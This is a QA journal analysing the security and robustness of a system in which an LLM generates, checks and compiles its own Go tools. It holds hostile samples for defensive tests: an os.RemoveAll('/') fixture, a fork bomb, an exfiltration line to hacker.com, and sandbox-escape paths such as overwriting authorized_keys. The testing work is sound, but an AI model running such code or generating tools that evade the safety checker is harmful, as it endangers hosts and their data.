# Quality Assurance Journal: Ouroboros Loop Boundary Analysis
**Date:** 2026-02-09
**Time:** 00:01 EST
**Author:** Jules (QA Automation Engineer)
**Component:** `internal/autopoiesis/ouroboros.go` (Symbiogen Tool Generation System)
**Review Scope:** Code Quality, Robustness, Security, Test Coverage, and Operational Resilience
**Status:** DRAFT (Final Review Pending)
**Classification:** Internal Use Only
**Target Audience:** Autopoiesis Team, Security Team, QA Team

## 1. Executive Summary

The **Ouroboros Loop** is the critical "self-improvement" engine of codeNERD, responsible for generating, validating, compiling, and registering new tools at runtime. It implements a complex transactional state machine governed by Mangle logic. Failure in this subsystem halts the agent's ability to adapt, making it a single point of failure for long-running autonomous campaigns.

This analysis evaluates the robustness of the Ouroboros Loop against boundary conditions, edge cases, and adversarial inputs. While the happy path is well-tested, significant gaps exist in handling invalid states, resource exhaustion, and concurrency. Specifically, the system assumes a "cooperative" environment and lacks defensive depth against environmental failures (disk full, process limits) or malicious tool generation (sandbox escapes).

This document details the findings of a comprehensive **Boundary Value Analysis (BVA)** and proposes a rigorous set of **Negative Tests** to mitigate identified risks. It also includes a **Security Architecture Review** highlighting potential sandbox escapes and a **Mangle Logic Analysis** evaluating the state machine's resilience to invalid inputs.

## 2. Methodology

The analysis follows a rigorous "Negative Testing" methodology, focusing on four primary vectors:
1.  **Null/Undefined/Empty**: Validating system behavior when inputs are missing or semantically void.
2.  **Type Coercion**: Testing the system's ability to handle unexpected data types at interface boundaries (JSON, Mangle facts).
3.  **User Request Extremes**: Stress-testing the system with massive payloads, infinite recursion, and resource denial scenarios.
4.  **State Conflicts**: Identifying race conditions and inconsistencies in shared state (Registry, Filesystem).

In addition, a specific **Security Audit** was performed to identify potential sandbox escapes during the tool generation and execution phases.

## 3. System Architecture Review

The `OuroborosLoop` struct orchestrates a multi-stage pipeline:
1.  **Proposal**: Uses an LLM to generate Go code based on a `ToolNeed`.
2.  **Audit**: Statically analyzes code for safety (forbidden imports, infinite loops, etc.) via `SafetyChecker`.
3.  **Thunderdome**: (Optional) Adversarial testing where `PanicMaker` generates attacks to crash the tool.
4.  **Simulation**: Uses `mangle.DifferentialEngine` to predict state transitions and detect stagnation.
5.  **Commit**: Compiles the tool using `go build`, registers it in `RuntimeRegistry`, and updates Mangle facts.

### Critical Dependencies
-   **Mangle Engine**: Used for state tracking, policy enforcement, and stagnation detection. This is the "brain" of the loop.
-   **Go Compiler**: External process (`go build`) invoked via `os/exec`. This is the "hands" of the loop.
-   **Runtime Registry**: In-memory map of available tools, backed by disk storage. This is the "memory" of the loop.

## 4. Detailed Boundary Value Analysis

### Vector 1: Null/Undefined/Empty Inputs

**Scenario 1.1: Nil ToolNeed Object**
-   **Input**: `loop.Execute(ctx, nil)`
-   **Analysis**: The code accesses `need.Name` immediately for logging. This will cause a runtime panic. While `Execute` has a `recover` block, reliance on panic recovery for basic input validation is a code smell.
-   **Expected Behavior**: Return `ErrInvalidInput` immediately.
-   **Risk**: High. Caller (Orchestrator) logic errors could crash the loop thread.
-   **Recommendation**: Add explicit nil check at the start of `Execute`.

**Scenario 1.2: Empty String Fields in ToolNeed**
-   **Input**: `ToolNeed{Name: "", Purpose: ""}`
-   **Analysis**: `GenerateToolFromCode` checks for empty strings, but `Execute` uses `need.Name` to construct Mangle step IDs (`/step_`). An empty name results in `/step_`, which is a valid but semantically meaningless atom. This could lead to collisions if multiple empty-named needs are processed.
-   **Risk**: Medium. State corruption in Mangle.
-   **Recommendation**: Validate `need.Name` against a regex (e.g., `^[a-zA-Z0-9_]+$`).

**Scenario 1.3: Nil Context Propagation**
-   **Input**: `loop.Execute(nil, need)`
-   **Analysis**: The code likely defaults to `context.Background()` implicitly in some places, but `mangle.Query` and `exec.CommandContext` rely on a non-nil context. Passing `nil` will cause panics in the standard library or Mangle engine.
-   **Risk**: Medium.
-   **Recommendation**: Use `context.TODO()` or verify caller passes valid context.

**Scenario 1.4: Empty Registry Restoration**
-   **Input**: `ToolsDir` exists but is empty, or contains only directories/non-go files.
-   **Analysis**: `Restore` loops over directory entries. It correctly handles empty directories. However, if `ToolsDir` does not exist, it might fail silently or log a warning.
-   **Risk**: Low.
-   **Recommendation**: Ensure `Restore` creates the directory if missing.

**Scenario 1.5: Zero-Byte Source Files**
-   **Input**: A tool file exists on disk but is 0 bytes (truncated write).
-   **Analysis**: `Restore` reads the file. `sha256.Sum256` works on empty bytes (returns hash of empty string). The tool is registered with empty code. `ExecuteTool` might fail when trying to run the binary (if binary is also 0 bytes).
-   **Risk**: Low/Medium. Tool exists but is broken.
-   **Recommendation**: Validate file size > 0 during `Restore`.

### Vector 2: Type Coercion & Data Integrity

**Scenario 2.1: Mangle Fact Type Mismatch**
-   **Input**: `engine.AddFact("retry_attempt", stepID, "1", reason)` (String "1" instead of Int 1).
-   **Analysis**: Mangle is strongly typed in its schema (`Decl retry_attempt(StepID, Count, Reason)`). Passing a string for `Count` might be accepted by the Go API (which takes `interface{}`), but query matching will fail. The rule `retry_attempt(ID, N, _) :- N < 3` will fail because "1" < 3 is a type error or false.
-   **Risk**: High. Silent logic failure (infinite retries or immediate failure).
-   **Recommendation**: Implement strict type checking in `engine.AddFact` wrapper or use strongly typed helper functions.

**Scenario 2.2: Tool Input/Output JSON Corruption**
-   **Input**: Tool prints "Starting..." to stdout before printing JSON result.
-   **Analysis**: The wrapper `main.go` captures stdout. If the tool is "chatty", the output will be `Starting...{"output": "result"}`. `json.Unmarshal` will fail.
-   **Mitigation**: The wrapper should use a specific FD (e.g., FD 3) for output, or wrap stdout/stderr. Currently, it relies on clean stdout.
-   **Risk**: High. Many tools print logs to stdout by default.
-   **Recommendation**: Use a dedicated file descriptor for structured output or parse the *last valid JSON object* from stdout (similar to `extractJSON` in perception).

**Scenario 2.3: Binary Hash Collision (Theoretical)**
-   **Input**: Two different tools result in the same SHA256 hash.
-   **Analysis**: Extremely unlikely. However, if `ReadFile` fails and returns empty bytes (and error is ignored), both tools get the hash of empty string.
-   **Risk**: Low.
-   **Recommendation**: Ensure error handling in `Restore` is robust.

**Scenario 2.4: Boolean vs String in JSON**
-   **Input**: Tool returns `{"success": "true"}` vs `{"success": true}`.
-   **Analysis**: Go's `json.Unmarshal` is strict. If the struct expects `bool`, "true" (string) will fail. The `ToolOutput` struct uses `string` for `Output` and `Error`. This forces all results to be stringified, which is safe but limits expressiveness.
-   **Risk**: Low.
-   **Recommendation**: Keep as string for safety.

### Vector 3: User Request Extremes & Resource Limits

**Scenario 3.1: Massive Tool Code (The "Gigabyte Go File")**
-   **Input**: LLM generates a 1GB source file.
-   **Analysis**: `config.MaxToolSize` (default 100KB) is defined. However, is it checked *before* reading the whole string into memory? The LLM client returns a string. The `ToolGenerator` might allocate huge memory.
-   **Risk**: Medium (OOM).
-   **Recommendation**: Stream the LLM response or truncate at `MaxToolSize`.

**Scenario 3.2: Infinite Recursion / Logic Bombs**
-   **Input**: Tool code: `func main() { for {} }`
-   **Analysis**: `ExecuteTool` uses `context.WithTimeout`. The OS will kill the process after `ExecuteTimeout`. This is handled correctly.
-   **Risk**: Low.
-   **Recommendation**: Verify `context` cancellation works for subprocesses (use `exec.CommandContext`).

**Scenario 3.3: Massive Number of Iterations**
-   **Input**: `ExecuteConfig.MaxIters = 1,000,000`.
-   **Analysis**: Mangle facts accumulate (`iteration`, `state`, `history`). Query performance degrades with O(N) where N is number of facts. With 1M facts, `shouldHalt` queries will timeout.
-   **Risk**: High. Mangle engine performance collapse.
-   **Recommendation**: Implement fact retraction or archival for old iterations.

**Scenario 3.4: "Fork Bomb" Tool**
-   **Input**: Tool code: `func main() { for { go main() } }`
-   **Analysis**: `SafetyChecker` blocks `go` keyword? No, it allows goroutines if context is passed (maybe). But a fork bomb uses `exec.Command` to spawn self. `os/exec` is controlled.
-   **Risk**: Medium. Depends on strictness of `SafetyChecker`.
-   **Recommendation**: Run tools with `ulimit` (Process Limit) via `syscall.SysProcAttr`.

**Scenario 3.5: Disk Fill Attack**
-   **Input**: Tool writes 1TB to disk.
-   **Analysis**: `AllowFileSystem` is true by default. A tool can write indefinitely until disk full. There is no quota system for generated tools.
-   **Risk**: High. Denial of Service.
-   **Recommendation**: Run tools in a separate volume or enforce quotas.

### Vector 4: State Conflicts & Concurrency

**Scenario 4.1: Concurrent Compilation of Same Tool**
-   **Input**: Two threads call `GenerateToolFromCode` for "my_tool" simultaneously.
-   **Analysis**:
    1.  Thread A writes `my_tool.go`.
    2.  Thread B writes `my_tool.go` (overwriting A).
    3.  Thread A runs `go build` (compiles B's code).
    4.  Thread B runs `go build`.
    Result: Race condition on file system. If content differs, A might register B's binary with A's hash/metadata.
-   **Risk**: High. Data corruption in Registry.
-   **Recommendation**: Use a file lock or unique temporary directories for compilation.

**Scenario 4.2: Hot-Reload Locking (Windows)**
-   **Input**: `ExecuteTool` is running "tool_v1". `hotReload` tries to overwrite binary.
-   **Analysis**: Windows locks running binaries. `go build -o tool.exe` will fail with "Access Denied". The loop will fail the commit phase.
-   **Risk**: High on Windows. System instability.
-   **Recommendation**: On Windows, rename old binary to `.old` before writing new one (atomic rename usually works even if locked, sometimes). Or wait for termination.

**Scenario 4.3: Registry Read/Write Race**
-   **Input**: `Register` (Write) vs `List` (Read).
-   **Analysis**: `RuntimeRegistry` uses `sync.RWMutex`. This is thread-safe for the map itself.
-   **Risk**: Low.
-   **Recommendation**: None, implementation is correct.

**Scenario 4.4: Mangle Engine Concurrency**
-   **Input**: Multiple Ouroboros loops sharing one Mangle engine.
-   **Analysis**: `NewOuroborosLoop` creates its own engine instance. They are isolated.
-   **Risk**: Low.
-   **Recommendation**: Ensure `Orchestrator` manages loop lifecycles correctly.

## 5. Proposed Test Implementations

This section provides the full Go code for the negative tests required to close the identified gaps.

### 5.1 Nil Need Safety Test
```go
// TODO: TEST_GAP: TestOuroborosLoop_Execute_NilNeed
func TestOuroborosLoop_Execute_NilNeed(t *testing.T) {
	// Setup
	mockLLM := &MockLLMClient{}
	config := DefaultOuroborosConfig(t.TempDir())
	loop := NewOuroborosLoop(mockLLM, config)

	// Execute with nil need
	// We expect it NOT to panic, or to panic and recover gracefully with an error in result
	defer func() {
		if r := recover(); r != nil {
			// Current implementation panics and recovers, logging error
			// We verify result is returned with error
		}
	}()

	result := loop.Execute(context.Background(), nil)

	if result == nil {
		t.Fatal("Expected result from Execute(nil)")
	}
	if result.Success {
		t.Error("Expected failure for nil need")
	}
	if !strings.Contains(result.Error, "panic") && !strings.Contains(result.Error, "nil") {
		t.Errorf("Expected panic/nil error, got: %s", result.Error)
	}
}
```

### 5.2 Concurrent Execution Test
```go
// TODO: TEST_GAP: TestOuroborosLoop_ExecuteTool_Concurrent
func TestOuroborosLoop_ExecuteTool_Concurrent(t *testing.T) {
	// Setup registry with a tool
	registry := NewRuntimeRegistry()
	toolName := "echo_tool"
	// Mock a binary (using 'echo' command if on unix, or just skip execution logic and test registry lock)
	// For unit test, we might mock the executor. But here we test OuroborosLoop wrapper.

	// Better: Use a real compiled tool that sleeps for 100ms
	// ... (setup code to compile a sleeper tool) ...

	loop := &OuroborosLoop{
		registry: registry,
		config: DefaultOuroborosConfig("/tmp"),
		stats: OuroborosStats{},
	}

	// Register a fake tool
	registry.Register(&GeneratedTool{Name: toolName}, &CompileResult{OutputPath: "/bin/echo", Success: true})

	// Concurrent Execution
	concurrency := 10
	errCh := make(chan error, concurrency)

	for i := 0; i < concurrency; i++ {
		go func() {
			// We expect this to fail finding binary "/bin/echo" maybe, but it shouldn't panic
			_, err := loop.ExecuteTool(context.Background(), toolName, "hello")
			errCh <- err
		}()
	}

	for i := 0; i < concurrency; i++ {
		err := <-errCh
		// We just care that it doesn't race-panic
		_ = err
	}
}
```

### 5.3 Mangle Type Safety Test
```go
// TODO: TEST_GAP: TestOuroborosLoop_Mangle_TypeMismatch
func TestOuroborosLoop_Mangle_TypeMismatch(t *testing.T) {
	// Setup engine
	engine, _ := mangle.NewEngine(mangle.DefaultConfig(), nil)
	loop := &OuroborosLoop{engine: engine}

	// Try to add a fact with wrong type (String where Int expected)
	// Assuming schema: Decl retry_attempt(StepID, Count, Reason)
	// We need to load schema first
	_ = engine.LoadSchemaString("Decl retry_attempt(StepID, Count, Reason).")

	// This calls engine.AddFact which uses interface{}
	// Mangle might accept it but query will fail
	loop.recordRetry("/step_1", 1, "reason") // Correct

	// Now try manual incorrect injection if we had a method exposed,
	// or verify internal methods don't do this.
	// Since recordRetry is typed (int), we are safe statically?
	// No, recordRetry takes int, but passes to AddFact.
	// What if we pass a huge int that overflows Mangle's number type?

	// Test: Huge Int
	loop.recordRetry("/step_1", 999999999999999999, "reason")

	// Query it back
	res, _ := engine.Query(context.Background(), "retry_attempt('/step_1', N, _)")
	if len(res.Bindings) == 0 {
		t.Error("Failed to retrieve huge int fact")
	}
}
```

### 5.4 FileSystem Sandbox Bypass Test
```go
// TODO: TEST_GAP: TestOuroborosLoop_FileSystem_Sandbox
func TestOuroborosLoop_FileSystem_Sandbox(t *testing.T) {
	// Setup SafetyChecker with FileSystem disallowed
	config := DefaultOuroborosConfig("/tmp")
	config.AllowFileSystem = false
	checker := NewSafetyChecker(config)

	// Malicious Code
	maliciousCode := `package main
import "os"
func main() {
	os.RemoveAll("/")
}`

	report := checker.Check(maliciousCode)
	if report.Safe {
		t.Fatal("Expected SafetyChecker to block os.RemoveAll when AllowFileSystem=false")
	}

	// Verify it caught the import or the call
	found := false
	for _, v := range report.Violations {
		if v.Type == ViolationForbiddenImport || v.Type == ViolationDangerousCall {
			found = true
		}
	}
	if !found {
		t.Errorf("Violation not found in report: %v", report.Violations)
	}
}
```

## 6. Mangle Logic Analysis

The Ouroboros state machine is defined in `internal/core/defaults/state.mg`. A deeper analysis of the predicates reveals potential logical gaps.

### Key Predicates
-   `valid_transition(State)`: Determines if moving to `State` is allowed.
-   `stagnation_detected(Hash)`: Checks if `Hash` has been seen before.
-   `should_halt(StepID)`: Checks if max iterations or retries exceeded.

### Failure Modes
1.  **Cycle Detection**: If `stagnation_detected` fails (e.g., hash collision), the loop might cycle forever between two states.
2.  **Stratification Errors**: If negation is used incorrectly in `valid_transition` (e.g., `valid(S) :- not invalid(S)`), it might lead to stratification errors if `invalid` depends on `valid`.
3.  **Fact Explosion**: `history` facts are never garbage collected. In a long-running process, this table grows indefinitely.
    -   *Impact*: Query time for `stagnation_detected` grows linearly/logarithmically.
    -   *Mitigation*: Implement a `cleanup_history` rule or periodical `Retract`.

## 7. Security Architecture Review

### Attack Tree: Sandbox Escape

1.  **Goal**: Execute arbitrary code on host.
2.  **Path A: Direct Execution**
    -   *Method*: Use `os/exec` to run `/bin/bash`.
    -   *Defense*: `SafetyChecker` blocks `os/exec` unless `AllowExec` is true.
    -   *Gap*: If `AllowExec` is true (default in `DefaultOuroborosConfig`?), then game over.
    -   *Recommendation*: `AllowExec` should default to `false`.

3.  **Path B: File System overwrite**
    -   *Method*: Overwrite `~/.bashrc` or `~/.ssh/authorized_keys`.
    -   *Defense*: `AllowFileSystem` check.
    -   *Gap*: If `AllowFileSystem` is true (default), `os.WriteFile` is allowed.
    -   *Recommendation*: Restrict `ToolsDir` to a specific subdirectory and chroot/jail the process.

4.  **Path C: Network Exfiltration**
    -   *Method*: `net/http.Get("http://hacker.com?key=" + private_key)`.
    -   *Defense*: `AllowNetworking` config.
    -   *Gap*: `dns` lookup might still work even if `http` is blocked? No, `net` package blocked.
    -   *Recommendation*: Use strict allowlist for imports.

### Attack Tree: Denial of Service

1.  **Goal**: Crash the codeNERD agent.
2.  **Path A: OOM**
    -   *Method*: Allocate 10GB RAM in tool.
    -   *Defense*: OS limits? None by default.
    -   *Recommendation*: `Setrlimit` (RLIMIT_AS) on child process.

3.  **Path B: Disk Fill**
    -   *Method*: Loop `WriteFile`.
    -   *Defense*: None.
    -   *Recommendation*: Disk quotas.

## 8. Operational Recommendations

To safely operate Ouroboros in a production environment:

1.  **Monitoring**:
    -   Track `OuroborosStats` metrics (ToolsGenerated, SafetyViolations, Panics).
    -   Alert on `Panics > 0` or `SafetyViolations > 5`.
    -   Monitor Mangle fact count (`history` predicate).

2.  **Configuration**:
    -   Set `AllowExec = false` by default.
    -   Set `AllowFileSystem = false` or restrict to `/tmp/tools`.
    -   Set `MaxIters = 5` (fail fast).

3.  **Rollback**:
    -   Implement a "Safe Mode" that disables Ouroboros if panics are frequent.
    -   Keep previous versions of generated tools (Versioning).

## 9. Appendix: Test Coverage Matrix

| Feature | Happy Path | Null Inputs | Empty Inputs | Large Inputs | Concurrency | State Conflict | Security |
|---------|------------|-------------|--------------|--------------|-------------|----------------|----------|
| **Execute** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | N/A |
| **SafetyCheck** | ✅ | N/A | N/A | ❌ | N/A | N/A | ⚠️ (Weak) |
| **Compile** | ✅ | N/A | N/A | ❌ | ❌ | ❌ | N/A |
| **Register** | ✅ | ❌ | ❌ | N/A | ✅ | ✅ | N/A |
| **ExecuteTool** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ⚠️ (Weak) |

**Legend:**
-   ✅: Covered by existing tests
-   ❌: Not covered (Gap identified)
-   ⚠️: Partially covered or weak implementation
-   N/A: Not applicable

## 10. Conclusion

The Ouroboros Loop is a powerful capability but operates with "superuser" trust assumptions. The current test suite validates the *mechanism* of tool generation but fails to validate the *safety* of the generated tools or the resilience of the generation process itself.

The most critical finding is the lack of granular file system restrictions (`Scenario 3.4`), allowing generated tools to potentially destroy the agent's environment. Immediate remediation is recommended to enhance the `SafetyChecker` and expand the test suite to cover these adversarial scenarios.

By implementing the recommendations in this journal, the Ouroboros Loop can evolve from a "fragile prototype" to a "robust production subsystem" capable of safe, autonomous self-improvement.
